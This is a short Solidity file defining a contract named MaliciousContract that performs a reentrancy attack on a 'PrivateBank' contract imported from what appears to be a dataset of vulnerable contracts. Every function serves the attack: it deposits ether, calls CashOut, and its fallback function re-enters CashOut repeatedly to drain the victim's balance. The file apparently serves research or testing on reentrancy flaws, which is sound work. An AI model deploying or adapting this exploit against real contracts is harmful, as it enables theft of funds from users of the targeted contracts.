pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol";

contract MaliciousContract {
    PrivateBank privateBank;

    constructor(address _victimAddress) public {
        privateBank = PrivateBank(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(
            amount >= 1 ether,
            "Must attempt and attack with at least 1 ether"
        );
        privateBank.CashOut(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        privateBank.Deposit.value(msg.value)();
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(privateBank).balance >= 1 ether) {
            privateBank.CashOut(1 ether);
        }
    }
}
